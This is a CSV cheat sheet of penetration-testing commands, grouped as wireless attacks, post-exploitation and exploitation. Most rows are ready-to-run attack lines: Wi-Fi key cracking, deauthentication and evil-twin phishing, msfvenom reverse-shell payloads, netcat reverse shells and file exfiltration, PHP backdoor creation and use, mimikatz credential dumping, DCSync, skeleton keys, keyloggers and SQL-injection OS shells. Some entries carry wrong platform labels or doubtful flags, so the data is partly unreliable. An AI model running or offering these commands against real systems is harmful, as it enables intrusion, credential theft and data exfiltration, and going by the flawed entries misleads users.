tool,command,description,category,use_case,flags,os,reference_link,supported_languages
aireplay-ng,aireplay-ng -3 -b 00:11:22:33:44:55 wlan0,Perform ARP request replay attack.,Wireless Attacks,Packet injection,"[""-3"",""-b""]",Linux,https://www.aircrack-ng.org/doku.php?id=aireplay-ng,
aircrack-ng,aircrack-ng -w wordlist.txt capture.cap,Crack WPA key using a wordlist.,Wireless Attacks,Password cracking,"[""-w""]",Linux,https://www.aircrack-ng.org/documentation.html,
wifite,wifite --wpa -i wlan0,Target WPA networks with Wifite.,Wireless Attacks,WPA attack,"[""--wpa"",""-i""]",Linux,https://github.com/derv82/wifite2,
wifiphisher,wifiphisher -i wlan0 -a evil_twin,Set up an evil twin AP for phishing.,Wireless Attacks,Wi-Fi phishing,"[""-i"",""-a""]",Linux,https://wifiphisher.org/,
kismet,kismet -c wlan0 --no-gps,Run Kismet without GPS logging.,Wireless Attacks,Wireless monitoring,"[""-c"",""--no-gps""]",Linux,https://www.kismetwireless.net/docs/,
mdk4,mdk4 wlan0 -b beacon_flood,Flood network with fake AP beacons.,Wireless Attacks,Beacon flooding,"[""-b""]",Linux,https://github.com/aircrack-ng/mdk4,
airmon-ng,airmon-ng stop wlan0mon,Disable monitor mode on wlan0mon.,Wireless Attacks,Interface configuration,"[""stop""]",Linux,https://www.aircrack-ng.org/doku.php?id=airmon-ng,
airodump-ng,airodump-ng --write capture wlan0,Save captured packets to a file.,Wireless Attacks,Packet capturing,"[""--write""]",Linux,https://www.aircrack-ng.org/doku.php?id=airodump-ng,
aireplay-ng,aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0,Perform interactive packet replay.,Wireless Attacks,Packet injection,"[""-2"",""-p"",""-c""]",Linux,https://www.aircrack-ng.org/doku.php?id=aireplay-ng,
aircrack-ng,aircrack-ng -b 00:11:22:33:44:55 capture.cap,Crack key for a specific AP.,Wireless Attacks,Password cracking,"[""-b""]",Linux,https://www.aircrack-ng.org/documentation.html,
wifite,wifite --wep -i wlan0,Target WEP networks with Wifite.,Wireless Attacks,WEP attack,"[""--wep"",""-i""]",Linux,https://github.com/derv82/wifite2,
wifiphisher,wifiphisher -i wlan0 --essid FreeWiFi,Create rogue AP with custom ESSID.,Wireless Attacks,Wi-Fi phishing,"[""-i"",""--essid""]",Linux,https://wifiphisher.org/,
kismet,kismet -c wlan0 -t capture,Save Kismet captures to a file.,Wireless Attacks,Packet capturing,"[""-c"",""-t""]",Linux,https://www.kismetwireless.net/docs/,
mdk4,mdk4 wlan0 -a auth_flood,Flood network with authentication requests.,Wireless Attacks,Authentication flooding,"[""-a""]",Linux,https://github.com/aircrack-ng/mdk4,
airmon-ng,airmon-ng check wlan0,Check for interfering processes on wlan0.,Wireless Attacks,Interface diagnostics,"[""check""]",Linux,https://www.aircrack-ng.org/doku.php?id=airmon-ng,
airodump-ng,airodump-ng -c 1-13 wlan0,Scan all Wi-Fi channels.,Wireless Attacks,Network scanning,"[""-c""]",Linux,https://www.aircrack-ng.org/doku.php?id=airodump-ng,
aireplay-ng,aireplay-ng -1 0 -a 00:11:22:33:44:55 wlan0,Perform fake authentication with an AP.,Wireless Attacks,Fake authentication,"[""-1"",""-a""]",Linux,https://www.aircrack-ng.org/doku.php?id=aireplay-ng,
aircrack-ng,aircrack-ng -J capture capture.cap,Generate an hccap file for WPA cracking.,Wireless Attacks,Password cracking,"[""-J""]",Linux,https://www.aircrack-ng.org/documentation.html,
wifite,wifite --all -i wlan0,Attack all detected Wi-Fi networks.,Wireless Attacks,Comprehensive Wi-Fi attack,"[""--all"",""-i""]",Linux,https://github.com/derv82/wifite2,
wifiphisher,wifiphisher -i wlan0 --nojamming,Run Wifiphisher without jamming.,Wireless Attacks,Wi-Fi phishing,"[""-i"",""--nojamming""]",Linux,https://wifiphisher.org/,
kismet,kismet -c wlan0 --log-prefix logs/,Save Kismet logs to a custom directory.,Wireless Attacks,Packet capturing,"[""-c"",""--log-prefix""]",Linux,https://www.kismetwireless.net/docs/,
mdk4,mdk4 wlan0 -d deauthall,Deauthenticate all clients in range.,Wireless Attacks,Deauthentication attack,"[""-d""]",Linux,https://github.com/aircrack-ng/mdk4,
airmon-ng,airmon-ng check kill wlan0,Kill interfering processes for wlan0.,Wireless Attacks,Interface diagnostics,"[""check"",""kill""]",Linux,https://www.aircrack-ng.org/doku.php?id=airmon-ng,
airodump-ng,airodump-ng --output-format pcap wlan0,Save captures in pcap format.,Wireless Attacks,Packet capturing,"[""--output-format""]",Linux,https://www.aircrack-ng.org/doku.php?id=airodump-ng,
aireplay-ng,aireplay-ng -4 -b 00:11:22:33:44:55 wlan0,Perform chop-chop attack.,Wireless Attacks,WEP attack,"[""-4"",""-b""]",Linux,https://www.aircrack-ng.org/doku.php?id=aireplay-ng,
aircrack-ng,aircrack-ng -e FreeWiFi capture.cap,Crack key for an AP with specific ESSID.,Wireless Attacks,Password cracking,"[""-e""]",Linux,https://www.aircrack-ng.org/documentation.html,
wifite,wifite --cracked,Show previously cracked networks.,Wireless Attacks,Attack history,"[""--cracked""]",Linux,https://github.com/derv82/wifite2,
wifiphisher,wifiphisher -i wlan0 --template oauth,Use OAuth phishing template.,Wireless Attacks,Wi-Fi phishing,"[""-i"",""--template""]",Linux,https://wifiphisher.org/,
kismet,kismet -c wlan0 --no-console,Run Kismet without console output.,Wireless Attacks,Wireless monitoring,"[""-c"",""--no-console""]",Linux,https://www.kismetwireless.net/docs/,
mdk4,mdk4 wlan0 -f ssid_flood,Flood network with fake SSIDs.,Wireless Attacks,SSID flooding,"[""-f""]",Linux,https://github.com/aircrack-ng/mdk4,
airmon-ng,airmon-ng start wlan0 6,Set wlan0 to monitor mode on channel 6.,Wireless Attacks,Interface configuration,"[""start""]",Linux,https://www.aircrack-ng.org/doku.php?id=airmon-ng,
airodump-ng,airodump-ng --encrypt WPA wlan0,Filter for WPA-encrypted networks.,Wireless Attacks,Network scanning,"[""--encrypt""]",Linux,https://www.aircrack-ng.org/doku.php?id=airodump-ng,
aireplay-ng,aireplay-ng -5 -b 00:11:22:33:44:55 wlan0,Perform fragment attack.,Wireless Attacks,WEP attack,"[""-5"",""-b""]",Linux,https://www.aircrack-ng.org/doku.php?id=aireplay-ng,
aircrack-ng,aircrack-ng -a 2 capture.cap,Force WPA2 cracking mode.,Wireless Attacks,Password cracking,"[""-a""]",Linux,https://www.aircrack-ng.org/documentation.html,
wifite,wifite --dict wordlist.txt -i wlan0,Use custom wordlist for cracking.,Wireless Attacks,Password cracking,"[""--dict"",""-i""]",Linux,https://github.com/derv82/wifite2,
wifiphisher,wifiphisher -i wlan0 --logging,Enable logging for phishing attacks.,Wireless Attacks,Wi-Fi phishing,"[""-i"",""--logging""]",Linux,https://wifiphisher.org/,
kismet,kismet -c wlan0 --alerts,Enable Kismet alerts for suspicious activity.,Wireless Attacks,Wireless monitoring,"[""-c"",""--alerts""]",Linux,https://www.kismetwireless.net/docs/,
mdk4,mdk4 wlan0 -e eapol_flood,Flood network with EAPOL packets.,Wireless Attacks,EAPOL flooding,"[""-e""]",Linux,https://github.com/aircrack-ng/mdk4,
airmon-ng,airmon-ng check wlan0 --verbose,Check processes with verbose output.,Wireless Attacks,Interface diagnostics,"[""check"",""--verbose""]",Linux,https://www.aircrack-ng.org/doku.php?id=airmon-ng,
airodump-ng,airodump-ng --gpsd wlan0,Enable GPS logging for captures.,Wireless Attacks,Packet capturing,"[""--gpsd""]",Linux,https://www.aircrack-ng.org/doku.php?id=airodump-ng,
aireplay-ng,aireplay-ng -7 -b 00:11:22:33:44:55 wlan0,Perform P0841 attack.,Wireless Attacks,WEP attack,"[""-7"",""-b""]",Linux,https://www.aircrack-ng.org/doku.php?id=aireplay-ng,
aircrack-ng,aircrack-ng -S,Test WEP key cracking speed.,Wireless Attacks,Performance testing,"[""-S""]",Linux,https://www.aircrack-ng.org/documentation.html,
wifite,wifite --pmkid -i wlan0,Capture PMKID for WPA attack.,Wireless Attacks,PMKID attack,"[""--pmkid"",""-i""]",Linux,https://github.com/derv82/wifite2,
wifiphisher,wifiphisher -i wlan0 --captive-portal,Use captive portal for phishing.,Wireless Attacks,Wi-Fi phishing,"[""-i"",""--captive-portal""]",Linux,https://wifiphisher.org/,
kismet,kismet -c wlan0 --no-logging,Disable logging in Kismet.,Wireless Attacks,Wireless monitoring,"[""-c"",""--no-logging""]",Linux,https://www.kismetwireless.net/docs/,
mdk4,mdk4 wlan0 -m michael_shutdown,Exploit Michael shutdown vulnerability.,Wireless Attacks,TKIP attack,"[""-m""]",Linux,https://github.com/aircrack-ng/mdk4,
airmon-ng,airmon-ng start wlan0 --channel 11,Set monitor mode on channel 11.,Wireless Attacks,Interface configuration,"[""start"",""--channel""]",Linux,https://www.aircrack-ng.org/doku.php?id=airmon-ng,
airodump-ng,airodump-ng --manufacturer wlan0,Display AP manufacturer information.,Wireless Attacks,Network scanning,"[""--manufacturer""]",Linux,https://www.aircrack-ng.org/doku.php?id=airodump-ng,
aireplay-ng,aireplay-ng -9 wlan0,Test injection capability of wlan0.,Wireless Attacks,Injection testing,"[""-9""]",Linux,https://www.aircrack-ng.org/doku.php?id=aireplay-ng,
aircrack-ng,aircrack-ng -p 4 capture.cap,Use 4 CPU cores for cracking.,Wireless Attacks,Password cracking,"[""-p""]",Linux,https://www.aircrack-ng.org/documentation.html,
wifite,wifite --kill -i wlan0,Kill conflicting processes before attack.,Wireless Attacks,Automated Wi-Fi attack,"[""--kill"",""-i""]",Linux,https://github.com/derv82/wifite2,
wifiphisher,wifiphisher -i wlan0 --dnsmasq,Use dnsmasq for DNS spoofing.,Wireless Attacks,Wi-Fi phishing,"[""-i"",""--dnsmasq""]",Linux,https://wifiphisher.org/,
kismet,kismet -c wlan0 --silent,Run Kismet in silent mode.,Wireless Attacks,Wireless monitoring,"[""-c"",""--silent""]",Linux,https://www.kismetwireless.net/docs/,
mdk4,mdk4 wlan0 -w wep_flood,Flood network with WEP packets.,Wireless Attacks,WEP flooding,"[""-w""]",Linux,https://github.com/aircrack-ng/mdk4,
airmon-ng,airmon-ng check wlan0 --fix,Automatically fix interfering processes.,Wireless Attacks,Interface diagnostics,"[""check"",""--fix""]",Linux,https://www.aircrack-ng.org/doku.php?id=airmon-ng,
airodump-ng,airodump-ng --wps wlan0,Display WPS information for APs.,Wireless Attacks,Network scanning,"[""--wps""]",Linux,https://www.aircrack-ng.org/doku.php?id=airodump-ng,
aireplay-ng,aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0,Send continuous deauthentication packets.,Wireless Attacks,Deauthentication attack,"[""-0"",""-a""]",Linux,https://www.aircrack-ng.org/doku.php?id=aireplay-ng,
aircrack-ng,aircrack-ng -q capture.cap,Run cracking in quiet mode.,Wireless Attacks,Password cracking,"[""-q""]",Linux,https://www.aircrack-ng.org/documentation.html,
wifite,wifite --wps -i wlan0,Target WPS-enabled networks.,Wireless Attacks,WPS attack,"[""--wps"",""-i""]",Linux,https://github.com/derv82/wifite2,
wifiphisher,wifiphisher -i wlan0 --force-hostname,Force hostname resolution for phishing.,Wireless Attacks,Wi-Fi phishing,"[""-i"",""--force-hostname""]",Linux,https://wifiphisher.org/,
kismet,kismet -c wlan0 --export pcap,Export captures to pcap format.,Wireless Attacks,Packet capturing,"[""-c"",""--export""]",Linux,https://www.kismetwireless.net/docs/,
metasploit,msfconsole,Launch Metasploit for post-exploitation tasks.,Post-Exploitation,Exploitation framework,[],Linux,https://docs.metasploit.com/,
metasploit,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe,Generate a reverse TCP Meterpreter payload.,Post-Exploitation,Payload creation,"[""-p"",""-f""]",Linux,https://docs.metasploit.com/,
weevely,weevely generate password /tmp/shell.php,Generate a PHP backdoor with a password.,Post-Exploitation,Backdoor creation,"[""generate""]",Linux,https://github.com/epinna/weevely3,
weevely,weevely http://example.com/shell.php password,Connect to a PHP backdoor.,Post-Exploitation,Backdoor access,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz sekurlsa::logonpasswords,Dump plaintext credentials from memory.,Post-Exploitation,Credential dumping,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --client,Launch Empire client for post-exploitation.,Post-Exploitation,C2 framework,"[""--client""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec smb 192.168.1.100 -u user -p pass,Enumerate SMB shares with credentials.,Post-Exploitation,SMB enumeration,"[""-u"",""-p""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -u user -p pass -d domain.local -c All,Collect Active Directory data for analysis.,Post-Exploitation,AD enumeration,"[""-u"",""-p"",""-d"",""-c""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc -lvp 4444,Set up a listener for reverse shells.,Post-Exploitation,Reverse shell,"[""-lvp""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
netcat,nc 192.168.1.100 4444 -e /bin/bash,Connect to a listener with a bash shell.,Post-Exploitation,Reverse shell,"[""-e""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/manage/migrate,Migrate Meterpreter to another process.,Post-Exploitation,Process migration,"[""use""]",Linux,https://docs.metasploit.com/,
metasploit,use post/windows/gather/credentials,Gather credentials from a compromised system.,Post-Exploitation,Credential harvesting,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :shell_sh whoami,Execute whoami via PHP backdoor.,Post-Exploitation,Command execution,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz privilege::debug,Enable debug privilege for credential dumping.,Post-Exploitation,Privilege escalation,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --listener http,Start an HTTP listener for Empire agents.,Post-Exploitation,C2 listener,"[""--listener""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec smb 192.168.1.0/24 --local-auth,Enumerate SMB across a network.,Post-Exploitation,Network enumeration,"[""--local-auth""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -c DCOnly -d domain.local,Collect only Domain Controller data.,Post-Exploitation,AD enumeration,"[""-c"",""-d""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc -u 192.168.1.100 4444,Send UDP packets to connect to a listener.,Post-Exploitation,Data exfiltration,"[""-u""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/escalate/getsystem,Attempt privilege escalation to SYSTEM.,Post-Exploitation,Privilege escalation,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :file_upload /tmp/malware,Upload a file via PHP backdoor.,Post-Exploitation,File transfer,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz kerberos::list,List cached Kerberos tickets.,Post-Exploitation,Credential dumping,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --agent agent_name shell whoami,Execute whoami on an Empire agent.,Post-Exploitation,Command execution,"[""--agent"",""shell""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec winrm 192.168.1.100 -u user -p pass -x whoami,Execute whoami via WinRM.,Post-Exploitation,Command execution,"[""-u"",""-p"",""-x""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -u user -p pass --dns-tcp,Use TCP for DNS queries in AD collection.,Post-Exploitation,AD enumeration,"[""-u"",""-p"",""--dns-tcp""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc 192.168.1.100 4444 < data.txt,Send a file to a remote listener.,Post-Exploitation,Data exfiltration,[],Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/gather/enum_logged_on_users,Enumerate logged-on users.,Post-Exploitation,System enumeration,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :net_ifaces,List network interfaces via backdoor.,Post-Exploitation,System enumeration,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash,Perform pass-the-hash attack.,Post-Exploitation,Lateral movement,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --module powershell/credentials/mimikatz,Run Mimikatz module via Empire.,Post-Exploitation,Credential dumping,"[""--module""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec smb 192.168.1.100 --sam,Dump SAM hashes from a target.,Post-Exploitation,Credential dumping,"[""--sam""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -c All --zip,Compress collected AD data.,Post-Exploitation,AD enumeration,"[""-c"",""--zip""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc -lvp 4444 > output.txt,Receive a file from a remote host.,Post-Exploitation,Data exfiltration,"[""-lvp""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/manage/enable_rdp,Enable RDP on a compromised system.,Post-Exploitation,Persistence,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :file_download /etc/passwd,Download a file via PHP backdoor.,Post-Exploitation,Data exfiltration,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz lsadump::sam,Dump SAM database credentials.,Post-Exploitation,Credential dumping,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --stager dll,Generate a DLL stager for persistence.,Post-Exploitation,Payload creation,"[""--stager""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec smb 192.168.1.100 --shares,List SMB shares on a target.,Post-Exploitation,SMB enumeration,"[""--shares""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -u user -p pass -gc dc.domain.local,Target a specific Global Catalog server.,Post-Exploitation,AD enumeration,"[""-u"",""-p"",""-gc""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc -nv 192.168.1.100 4444,Connect to a remote listener with verbose output.,Post-Exploitation,Reverse shell,"[""-nv""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/gather/hashdump,Dump password hashes from a system.,Post-Exploitation,Credential dumping,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :audit_suidbin,Find SUID binaries via backdoor.,Post-Exploitation,Privilege escalation,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz token::elevate,Elevate to SYSTEM token privileges.,Post-Exploitation,Privilege escalation,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --module powershell/persistence/schtasks,Create a scheduled task for persistence.,Post-Exploitation,Persistence,"[""--module""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec winrm 192.168.1.100 -u user -p pass --ps-exec,Execute PowerShell via WinRM.,Post-Exploitation,Command execution,"[""-u"",""-p"",""--ps-exec""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -u user -p pass --no-pass,Run without storing passwords.,Post-Exploitation,AD enumeration,"[""-u"",""-p"",""--no-pass""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc -lvp 4444 -e /bin/bash,Set up a bind shell listener.,Post-Exploitation,Bind shell,"[""-lvp"",""-e""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/manage/persistence_exe,Install an executable for persistence.,Post-Exploitation,Persistence,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :system_info,Gather system information via backdoor.,Post-Exploitation,System enumeration,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz dpapi::cred /in:cred.bin,Decrypt DPAPI credentials.,Post-Exploitation,Credential dumping,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --module powershell/collection/keylogger,Start a keylogger on an agent.,Post-Exploitation,Data collection,"[""--module""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec smb 192.168.1.100 --users,Enumerate users on a target.,Post-Exploitation,User enumeration,"[""--users""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -u user -p pass --collectionmethod Session,Collect session data only.,Post-Exploitation,AD enumeration,"[""-u"",""-p"",""--collectionmethod""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc -z 192.168.1.100 1-1000,Scan open ports on a target.,Post-Exploitation,Network enumeration,"[""-z""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/gather/enum_domain,Enumerate domain information.,Post-Exploitation,Domain enumeration,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :file_rm /tmp/malware,Delete a file via PHP backdoor.,Post-Exploitation,File manipulation,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz vault::list,List Windows Vault credentials.,Post-Exploitation,Credential dumping,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --module powershell/lateral_movement/invoke_psexec,Perform lateral movement via PsExec.,Post-Exploitation,Lateral movement,"[""--module""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec smb 192.168.1.100 --pass-pol,Retrieve password policy.,Post-Exploitation,Policy enumeration,"[""--pass-pol""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -u user -p pass --hashes ntlm,Use NTLM hashes for authentication.,Post-Exploitation,AD enumeration,"[""-u"",""-p"",""--hashes""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc -v 192.168.1.100 80 < request.txt,Send HTTP request to a target.,Post-Exploitation,Data exfiltration,"[""-v""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/gather/enum_applications,Enumerate installed applications.,Post-Exploitation,System enumeration,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :sql_query 'SELECT * FROM users',Execute SQL query via backdoor.,Post-Exploitation,Database access,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz misc::skeleton,Create a skeleton key for persistence.,Post-Exploitation,Persistence,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --module powershell/management/get_screenshot,Capture a screenshot from an agent.,Post-Exploitation,Data collection,"[""--module""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec smb 192.168.1.100 --exec-method wmiexec,Use WMI for command execution.,Post-Exploitation,Command execution,"[""--exec-method""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -u user -p pass --output /tmp/ad_data,Save AD data to a custom directory.,Post-Exploitation,AD enumeration,"[""-u"",""-p"",""--output""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc -lvp 4444 -t,Set up a telnet-compatible listener.,Post-Exploitation,Reverse shell,"[""-lvp"",""-t""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/manage/add_user,Add a new user to the system.,Post-Exploitation,Persistence,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :file_zip /var/www backup.zip,Create a zip archive via backdoor.,Post-Exploitation,Data exfiltration,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz crypto::certificates,List system certificates.,Post-Exploitation,System enumeration,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --module powershell/credentials/dcsync,Perform DCSync to extract AD credentials.,Post-Exploitation,Credential dumping,"[""--module""]",Linux,https://github.com/BC-Security/Empire,
crackmapexec,crackmapexec smb 192.168.1.100 --ntds,Dump NTDS.dit file from a DC.,Post-Exploitation,Credential dumping,"[""--ntds""]",Linux,https://github.com/byt3bl33d3r/CrackMapExec,
bloodhound,bloodhound-python -u user -p pass --ldap-port 636,Use LDAPS for AD data collection.,Post-Exploitation,AD enumeration,"[""-u"",""-p"",""--ldap-port""]",Linux,https://github.com/BloodHoundAD/BloodHound,
netcat,nc -w 3 192.168.1.100 4444,Connect to a listener with timeout.,Post-Exploitation,Reverse shell,"[""-w""]",Linux,https://www.man7.org/linux/man-pages/man1/nc.1.html,
metasploit,use post/windows/gather/enum_patches,Enumerate installed patches.,Post-Exploitation,System enumeration,"[""use""]",Linux,https://docs.metasploit.com/,
weevely,weevely http://example.com/shell.php password :net_proxy,Set up a proxy via backdoor.,Post-Exploitation,Network pivoting,[],Linux,https://github.com/epinna/weevely3,
mimikatz,mimikatz logonpasswords /export,Export plaintext credentials to a file.,Post-Exploitation,Credential dumping,[],Linux,https://github.com/gentilkiwi/mimikatz,
powershell-empire,empire --module powershell/management/powerview,Run PowerView for AD enumeration.,Post-Exploitation,AD enumeration,"[""--module""]",Linux,https://github.com/BC-Security/Empire,
metasploit,msfconsole,Launch Metasploit for vulnerability exploitation.,Exploitation,Exploitation framework,[],Linux,https://docs.metasploit.com/,
metasploit,use exploit/windows/smb/ms17_010_eternalblue,Exploit MS17-010 SMB vulnerability.,Exploitation,Remote code execution,"[""use""]",Linux,https://docs.metasploit.com/,
sqlmap,sqlmap -u http://example.com --dbs,Enumerate databases via SQL injection.,Exploitation,SQL injection,"[""-u"",""--dbs""]",Linux,http://sqlmap.org/,
burpsuite,burpsuite,Launch Burp Suite for web vulnerability testing.,Exploitation,Web application testing,[],Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit ms17-010,Search Exploit-DB for MS17-010 exploits.,Exploitation,Exploit search,[],Linux,https://www.exploit-db.com/,
hydra,hydra -l admin -P wordlist.txt ssh://192.168.1.100,Brute-force SSH credentials.,Exploitation,Password cracking,"[""-l"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
msfvenom,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe,Generate a reverse TCP Meterpreter payload.,Exploitation,Payload creation,"[""-p"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script vuln 192.168.1.100,Scan for vulnerabilities using NSE scripts.,Exploitation,Vulnerability scanning,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --tables,Enumerate tables in a database.,Exploitation,SQL injection,"[""-u"",""--tables""]",Linux,http://sqlmap.org/,
metasploit,use exploit/multi/http/tomcat_mgr_upload,Exploit Tomcat manager upload vulnerability.,Exploitation,Web application exploitation,"[""use""]",Linux,https://docs.metasploit.com/,
hydra,hydra -L users.txt -P wordlist.txt ftp://192.168.1.100,Brute-force FTP credentials.,Exploitation,Password cracking,"[""-L"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --proxy,Start Burp Suite proxy for intercepting traffic.,Exploitation,Traffic interception,"[""--proxy""]",Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit wordpress,Search Exploit-DB for WordPress exploits.,Exploitation,Exploit search,[],Linux,https://www.exploit-db.com/,
msfvenom,msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > payload.elf,Generate a Linux reverse shell payload.,Exploitation,Payload creation,"[""-p"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script smb-vuln-ms17-010 192.168.1.100,Check for MS17-010 SMB vulnerability.,Exploitation,Vulnerability scanning,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --os-shell,Obtain an OS shell via SQL injection.,Exploitation,SQL injection,"[""-u"",""--os-shell""]",Linux,http://sqlmap.org/,
metasploit,use exploit/windows/http/iis_ms15_034,Exploit IIS MS15-034 vulnerability.,Exploitation,Remote code execution,"[""use""]",Linux,https://docs.metasploit.com/,
